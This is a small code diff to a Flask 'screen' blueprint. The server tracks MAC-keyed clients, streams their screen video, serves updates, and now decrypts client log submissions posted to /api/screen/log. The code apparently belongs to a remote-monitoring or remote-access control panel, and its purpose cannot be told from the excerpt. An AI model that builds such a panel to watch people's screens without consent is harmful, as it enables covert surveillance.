@@ -1,7 +1,7 @@
 from flask import Blueprint, request, render_template_string, session, redirect, url_for, send_from_directory, jsonify, Response
 from datetime import datetime
 import os, time, json, threading
-from core import clients_db, save_db, is_online, log_login_attempt, USERNAME, PASSWORD, UPDATE_DIR, VERSION_FILE
+from core import clients_db, save_db, is_online, log_login_attempt, USERNAME, PASSWORD, UPDATE_DIR, VERSION_FILE, decrypt_data
 
 bp = Blueprint('screen', __name__)
 
@@ -208,8 +208,8 @@ def stream_video(mac):
 
 @bp.route('/api/screen/log', methods=['POST'])
 def screen_log_endpoint():
-    mac = request.form.get('mac')
-    log_msg = request.form.get('log')
+    mac = decrypt_data(request.form.get('mac', ''))
+    log_msg = decrypt_data(request.form.get('log', ''))
     if mac in clients_db and log_msg:
         import urllib.parse
         log_msg = urllib.parse.unquote(log_msg)
